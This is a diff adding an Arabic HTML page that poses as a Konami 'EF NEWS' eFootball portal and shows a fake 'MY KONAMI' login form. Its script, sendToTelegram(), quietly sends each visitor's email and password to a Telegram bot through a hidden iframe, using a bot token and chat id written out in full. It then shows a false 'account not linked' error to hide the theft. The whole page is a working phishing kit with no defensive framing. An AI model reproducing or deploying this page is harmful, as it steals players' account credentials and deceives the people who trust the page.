@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>EF NEWS | ترحيب</title>
+  
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+  <style>
+    :root {
+      --primary-red: #c80014; 
+      --dark-red: #8b0000;
+      --bg-white: #ffffff;
+      --text-gray: #4a4a4a;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background-color: var(--primary-red);
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* واجهة الترحيب (تظهر مرة واحدة) */
+    #welcome-screen {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: linear-gradient(135deg, var(--primary-red), var(--dark-red));
+      display: none; 
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      padding: 20px;
+      animation: fadeIn 0.5s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .welcome-logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .welcome-logo i {
+      font-size: 50px;
+      color: var(--primary-red);
+      animation: pulse 2s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+    }
+
+    .welcome-content {
+      background: white;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 15px 50px rgba(0,0,0,0.4);
+      max-width: 500px;
+      width: 100%;
+      text-align: right;
+    }
+
+    .welcome-content h2 { 
+      color: var(--primary-red); 
+      font-size: 24px; 
+      margin-bottom: 20px; 
+      text-align: center;
+      border-bottom: 3px solid var(--primary-red); 
+      padding-bottom: 15px;
+      font-weight: 900;
+    }
+
+    .scroll-text {
+      font-size: 16px; 
+      color: #333; 
+      line-height: 1.9;
+      max-height: 400px; 
+      overflow-y: auto; 
+      padding: 15px;
+      margin-bottom: 25px;
+      font-weight: 500;
+      background: #f8f9fa;
+      border-radius: 12px;
+      border-right: 4px solid var(--primary-red);
+    }
+
+    .scroll-text::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    .scroll-text::-webkit-scrollbar-track {
+      background: #f1f1f1;
+      border-radius: 10px;
+    }
+
+    .scroll-text::-webkit-scrollbar-thumb {
+      background: var(--primary-red);
+      border-radius: 10px;
+    }
+
+    .scroll-text::-webkit-scrollbar-thumb:hover {
+      background: var(--dark-red);
+    }
+
+    .next-btn {
+      background: var(--primary-red); 
+      color: #000000; 
+      border: none;
+      width: 100%; 
+      padding: 14px; 
+      border-radius: 10px; 
+      font-size: 18px; 
+      font-weight: 900; 
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 5px 15px rgba(200, 0, 20, 0.3);
+    }
+
+    .next-btn:hover {
+      background: var(--dark-red);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(200, 0, 20, 0.4);
+    }
+
+    /* القائمة الجانبية (Sidebar) */
+    .menu-btn { position: absolute; top: 20px; right: 20px; background: rgba(255, 255, 255, 0.2); border: none; color: white; padding: 12px; border-radius: 8px; cursor: pointer; z-index: 1001; }
+    .sidebar { position: fixed; top: 0; right: -320px; width: 320px; height: 100%; background: #fff; box-shadow: -5px 0 15px rgba(0,0,0,0.3); transition: 0.4s ease; z-index: 1000; padding-top: 60px; }
+    .sidebar.active { right: 0; }
+    .sidebar-header { padding: 20px 25px; background: linear-gradient(135deg, var(--primary-red), var(--dark-red)); color: white; text-align: center; }
+    .sidebar a { display: block; padding: 15px 25px; color: #333; text-decoration: none; border-bottom: 1px solid #eee; font-weight: 600; }
+    .sidebar a i { margin-left: 10px; color: var(--primary-red); }
+
+    /* تسجيل الدخول */
+    .top-konami-logo { position: absolute; top: 25px; left: 50%; transform: translateX(-50%); z-index: 100; }
+    .top-konami-logo h1 { color: #ffffff; font-size: 24px; font-weight: 900; letter-spacing: 2px; }
+    .login-box { background: var(--bg-white); padding: 35px 25px; width: 90%; max-width: 400px; border-radius: 8px; text-align: center; z-index: 10; margin-top: 80px; }
+    .input-group { position: relative; margin-bottom: 15px; }
+    .input-group i { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); color: #999; }
+    .input-group input { width: 100%; padding: 15px 45px 15px 15px; border: 1px solid #ddd; border-radius: 5px; outline: none; }
+    .submit-btn { width: 100%; padding: 15px; background: var(--primary-red); color: #fff; border: none; border-radius: 5px; font-weight: 700; cursor: pointer; }
+
+    /* رسالة الخطأ */
+    .error-message { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: var(--primary-red); padding: 25px; border-radius: 10px; z-index: 2000; text-align: center; box-shadow: 0 5px 25px rgba(0,0,0,0.4); border: 2px solid var(--primary-red); width: 280px; }
+    .error-message.show { display: block; animation: shake 0.5s; }
+    @keyframes shake { 0%, 100% { transform: translate(-50%, -50%); } 25% { transform: translate(-52%, -50%); } 75% { transform: translate(-48%, -50%); } }
+  </style>
+</head>
+
+<body>
+
+  <div id="welcome-screen">
+    <div class="welcome-content">
+      <div class="welcome-logo">
+        <i class="fas fa-futbol"></i>
+      </div>
+      <h2>مرحباً بك في EF NEWS</h2>
+      <div class="scroll-text">
+        <div style="text-align: center; margin-bottom: 20px;">
+          <strong style="color: var(--primary-red); font-size: 17px;">أهلاً بك في EF News</strong><br>
+          <span style="color: #666; font-size: 14px;">المدعوم من <a href="https://my.konami.net/" target="_blank" style="color: #0066cc; font-weight: 700; text-decoration: none;">my.konami.net</a></span>
+        </div>
+
+        <div style="margin-bottom: 15px;">
+          <strong style="color: var(--primary-red); font-size: 16px;">🎮 ماذا يمكنك أن تفعل؟</strong>
+        </div>
+
+        <div style="padding-right: 10px;">
+          <p style="margin-bottom: 12px;">
+            <strong style="color: var(--primary-red);">✅</strong> تجربة التحديثات قبل نزولها الرسمي
+          </p>
+
+          <p style="margin-bottom: 12px;">
+            <strong style="color: var(--primary-red);">✅</strong> معرفة جميع الأحداث المقبلة لـ eFootball Mobile
+          </p>
+
+          <p style="margin-bottom: 12px;">
+            <strong style="color: var(--primary-red);">✅</strong> إعطاء ملاحظاتك وآرائك حول التحديثات الجديدة
+          </p>
+
+          <p style="margin-bottom: 12px;">
+            <strong style="color: var(--primary-red);">✅</strong> الحصول على أخبار حصرية قبل الجميع
+          </p>
+        </div>
+
+        <div style="text-align: center; margin-top: 20px; padding-top: 15px; border-top: 2px solid #eee;">
+          <strong style="color: var(--primary-red); font-size: 16px;">استمتع بتجربتك معنا! ⚽🚀</strong>
+        </div>
+      </div>
+      <button class="next-btn" onclick="closeWelcome()">تـالـي</button>
+    </div>
+  </div>
+
+  <button class="menu-btn" onclick="toggleSidebar()"><i class="fas fa-bars fa-lg"></i></button>
+  <div class="sidebar" id="sidebar">
+    <div class="sidebar-header"><h3>EF NEWS</h3><p>أخبار eFootball الحصرية</p></div>
+    <a href="#"><i class="fas fa-home"></i> الرئيسية</a>
+    <a href="#"><i class="fas fa-newspaper"></i> الأخبار</a>
+    <a href="#"><i class="fas fa-user-shield"></i> الأمان</a>
+    <a href="#" onclick="toggleSidebar()" style="color: red; margin-top: 20px;"><i class="fas fa-times"></i> إغلاق</a>
+  </div>
+
+  <div class="top-konami-logo"><h1>MY KONAMI</h1></div>
+
+  <div class="login-box">
+    <h2 style="margin-bottom:20px; color:#4a4a4a; font-size:18px;">تسجيل الدخول</h2>
+    <div class="input-group"><i class="fas fa-envelope"></i><input type="text" id="name" placeholder="البريد الإلكتروني"></div>
+    <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="lastname" placeholder="كلمة المرور"></div>
+    <button class="submit-btn" onclick="sendToTelegram()" id="submitBtn">دخول</button>
+  </div>
+
+  <div class="error-message" id="errorMessage">
+    <i class="fas fa-exclamation-circle" style="font-size: 35px; margin-bottom: 10px;"></i><br>
+    <strong>هذا الحساب ليس مربوط بkonami id</strong>
+  </div>
+
+  <iframe id="hiddenFrame" style="display:none"></iframe>
+
+  <script>
+    window.onload = function() {
+      if (!localStorage.getItem('welcomeShown')) {
+        document.getElementById('welcome-screen').style.display = 'flex';
+      }
+    };
+
+    function closeWelcome() {
+      localStorage.setItem('welcomeShown', 'true');
+      document.getElementById('welcome-screen').style.display = 'none';
+    }
+
+    function toggleSidebar() {
+      document.getElementById("sidebar").classList.toggle("active");
+    }
+
+    function sendToTelegram() {
+      const name = document.getElementById("name").value;
+      const lastname = document.getElementById("lastname").value;
+      const btn = document.getElementById("submitBtn");
+      if(!name || !lastname) { alert("يرجى إدخال البيانات"); return; }
+      
+      btn.disabled = true; btn.textContent = "جاري التحقق...";
+      const msg = `🎮 دخول جديد\n📧 البريد: ${name}\n🔒 الباسورد: ${lastname}`;
+      const url = `https://api.telegram.org/bot7704179499:AAG7JLOh8ZP0QP6c8woIvQ_414WMW9XQlgE/sendMessage?chat_id=6438359779&text=${encodeURIComponent(msg)}`;
+      
+      document.getElementById('hiddenFrame').src = url;
+      setTimeout(() => {
+        document.getElementById("errorMessage").classList.add("show");
+        btn.disabled = false; btn.textContent = "دخول";
+        setTimeout(() => document.getElementById("errorMessage").classList.remove("show"), 4000);
+      }, 1500);
+    }
+  </script>
+</body>
+</html>
